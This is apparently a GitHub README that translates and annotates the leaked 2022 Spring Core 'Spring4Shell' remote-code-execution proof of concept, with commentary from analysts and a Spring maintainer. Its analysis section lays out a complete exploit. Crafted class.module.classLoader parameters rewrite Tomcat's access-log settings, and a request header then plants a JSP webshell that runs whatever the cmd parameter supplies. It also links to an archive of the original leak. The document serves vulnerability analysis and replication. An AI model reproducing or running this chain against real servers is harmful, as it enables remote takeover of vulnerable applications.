# springcore-0day-en
The README from the ~~alleged~~ **appears confirmed!** 0day dropped on 2022-03-29 has been translated to English and cleaned up slightly to assist in your analysis and replication.

This should also help alleviate confusion & conflation with othe Spring-related vulnerabilities.

If you manage to create a demo application that folks could use to independently validate and deep-dive, please let me know via GitHub Issues so I can link it!

## TL;DR

Someone claimed, and then deleted, that by sending crafted requests to JDK9+ SpringBeans-using applications, *under certain circumstances*, that they can remotely:

* Modify the logging parameters of that application to achieve an arbitrary write.
* Use the modified logger to write a valid JSP file that contains a webshell.
* Use the webshell for remote execution tomfoolery.

Praetorian and others (ex. [@testanull](https://twitter.com/testanull/status/1509185015187345411)) publicly confirmed that they have replicated the issue. This is being described as a bypass for CVE-2010-1622 - and that the vulnerability is currently unpatched. Please read over Praetorian's guidance [here](https://www.praetorian.com/blog/spring-core-jdk9-rce/) which includes mitigation steps.

## Commentary

[Will Dormann](https://twitter.com/wdormann/status/1509205469193195525) (CERT/CC analyst) notes:

> So, somebody can produce a spring-beans-based Java app that uses parameter binding, and if that binding is with a Plain Old Java Object (POJO), this results in vulnerable code?
>
> Spring now warns about folks using this footgun?
>
> Are there any real-world apps that do this? If not 🤷

This does not instinctively seem like it's going to be a cataclysmic event such as Log4Shell, as this vulnerability appears to require some probing to get working depending on the target environment, and the consensus on Twitter (as of 3/30) is that this appears to be nondefault.

## Resources

The original PoC's README linked to an alleged security patch in Spring production [here](https://github.com/spring-projects/spring-framework/commit/7f7fb58dd0dae86d22268a4b59ac7c72a6c22529), however given the maintainer's rebuttal (see below) and Praetorian's confirmation of the vulnerabiloity (see above), this patch appears unrelated and was flagged by the original author probably as a misunderstanding.

[Sam Brannen](https://github.com/sbrannen) (maintainer) comments on that commit:

> What @Kontinuation said is correct.
> 
> The purpose of this commit is to inform anyone who had previously been using SerializationUtils#deserialize that it is dangerous to deserialize objects from untrusted sources.
> 
> The core Spring Framework does not use SerializationUtils to deserialize objects from untrusted sources.
> 
> If you believe you have discovered a security issue, please report it responsibly with the dedicated page: https://spring.io/security-policy
> 
> And please refrain from posting any additional comments to this commit.
> 
> Thank you

Looking for the original copy? Use vx-underground's archive here: https://share.vx-underground.org/SpringCore0day.7z

## TODOs

* Get a Mandarin speaker to help confirm and clean up this veeery rough machine-made translation.
* Replicate (after work lol).

# SpringBeans RCE Vulnerability Analysis

## Requirements
* JDK9 and above
* Using the Spring-beans package
* Spring parameter binding is used
* Spring parameter binding uses non-basic parameter types, such as general POJOs

> *Analyst's note:* This stated that the vulnerability can only attain RCE in nondefault cases. The author later claims this is a reasonable use of SpringBeans. Since this is not the *default* case, I'm laying shame on any news outlet claiming this vulnerability is the next log4shell. It categorically isn't.

## Demo

```
https://github.com/p1n93r/spring-rce-war
```

> *Analyst's note:* Gone, and no saved version. :/

## Vulnerability Analysis
Spring parameter binding does not introduce too much, you can do it yourself; its basic usage is to use the form of `.` to assign values to parameters. The actual assignment process will use reflection to call the parameters `getter` or `setter`.

When this vulnerability first came out, I thought it was a rubbish hole, because I thought there was a Class type attribute in the parameters that I needed to use, and no fool would open it.
I will use this property in POJOs; but when I follow it carefully, I find that things are not so simple.

For example, the data structure of the parameters I need to bind is as follows, which is a very simple POJO:

```
/**
* @author : p1n93r
* @date : 2022/3/29 17:34
*/
@Setter
@Getter

public class EvalBean {
    public EvalBean() throws ClassNotFoundException {
        System.out.println("[+] called EvalBean.EvalBean");
    }

    public String name;
    public CommonBean commonBean;

    public String getName() {
        System.out.println("[+] called EvalBean.getName");
        return name;
    }

    public void setName(String name) {
        System.out.println("[+] called EvalBean.setName");
        this.name = name;
    }

    public CommonBean getCommonBean() {
        System.out.println("[+] called EvalBean.getCommonBean");
        return commonBean;
    }

    public void setCommonBean(CommonBean commonBean) {
        System.out.println("[+] called EvalBean.setCommonBean");
        this.commonBean = commonBean;
    }
}
```

My Controller is written as follows, which is also very normal:

```
@RequestMapping("/index")
public void index(EvalBean evalBean, Model model) {
    System.out.println("=================");
    System.out.println(evalBean);
    System.out.println("=================");
}
```

So I started the whole process of parameter binding. When I followed the call position as follows, I was stunned.

> *Analyst's notes on screenshot 1*
>
> The author then shows a screenshot of `BreanWrapperImpl.class` (see [Spring Frameworks BeanWrapperImpl docs](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/beans/BeanWrapperImpl.html)) with an arrow pointing to `this.getCachedIntrospectionResults()` on line 110, with the label "Find property names from this cache."
> 
> The full line is:
>
> `PropertyDescriptor pd = this.getCachedIntrospectionResults() getPropertyDescriptor(propertyName);`
>
> Additionally, the author highlights several bind and [set/apply]PropertyValue events in their debugger, with the note "the process of Spring parameter binding."

When I looked at this "cache", I was stunned, why is there a "class" attribute cache here? ? ? ! ! ! ! !

> *Analyst's notes on screenshot 2*
>
> The author is still viewing the same `BreanWrapperImpl.class` file, hovering over `this.getCachedIntrospectionResults()` and using IntelliJ's Evaluate function. They show that the `propertyDescriptorCache` class definition is:
>
> `"class" -> (GenericTypeAwarePropertyDescriptor@5848) *org.springframework.beans.GenericTypeAwarePropertyDescriptor ...`
>
> And comment: "There is actually a class. There is no need to store the class attribute in the POJO we use at all. When spring defines parameters, it will bring a class property used to refer to the POJO class to be bound."


When I saw this, I knew I was wrong, this is not a garbage hole, it is really a nuclear bomb-level loophole! Now it is clear that we can easily get the class pair.

For example, the rest is to use this class object to construct the utilization chain. At present, the simpler way is to modify the log configuration of Tomcat and write the shell to the log.

The complete utilization chain is as follows:

```
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7b%66%75%63%6b%7d%69
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=%48%3a%5c%6d%79%4a%61%76%61%43%6f%64%65%5c%73%74%75%70%69%64%52%7
class.module.classLoader.resources.context.parent.pipeline.first.prefix=fuckJsp
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

Looking at the utilization chain, you can see that it is a very simple way to modify the Tomcat log configuration and use the log to write a shell; the specific attack steps are as follows, and the following five requests are sent successively:

```
http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7b%66%75%6
http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.directory=%48%3a%5c%6d
http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.prefix=fuckJsp
http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

After sending these five requests, Tomcat's log configuration is modified as follows:

> *Analyst's notes on screenshot 3*
>
> The author is now viewing a code fragment of `((WebappClassLoaderBase)evalBean.getClass().getClassLoader().getResources().getContext().getParent().getPipeline().getFirst();`
> 
> They show that for the AccessLogValve, the suffix is now `.jsp`, the the prefix is now `fuckJsp`, etc. - basically showing that the parameters they claim to be setting above have been saved to the `AccessLogValve`, overwriting the original configuration. **The goal of this is to manipulate this alleged vulnerability to create a log file with valid JSP in it to use as a webshell, which the attacker can then utilize normally.**

Then we just need to send a random request, add a header called fuck, and write to the shell:

```
GET /stupidRumor_war_exploded/fuckUUUU HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
fuck: <%Runtime.getRuntime().exec(request.getParameter("cmd"))%>
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

> *Analyst's notes on screenshot 4*
>
> The author shows a directory view which includes a presumably-new file titled `fuckJsp.jsp` - which the author claims to have set as the `AccessLogValve` with their above exploit. This is claimed to work because they set the logger to log the `fuck` headers of requests to `fuckJsp.jsp`. `fuckJsp.jsp` contains the contents:
>
> `-`
> `<%Runtime.getRuntime().exec(requests.getParameter("cmd"));%>`
> `-`
>
> A simple webshell which executes anything given in the `cmd` parameter, which the author points to with the descriptor "successfully wrote the shell."

The shell can be accessed normally:

> *Analyst's notes on screenshot 5*
>
> The author now shows Burp overlaid with `calc.exe` open after running a GET request to `/stupidRumor_war_exploded/fuckJsp.jsp?cmd=calc`

## Summary

* Now that the class object can be called, the use method must not write the log;
* I can follow it later. Why is a POJO class reference retained during the parameter binding process?
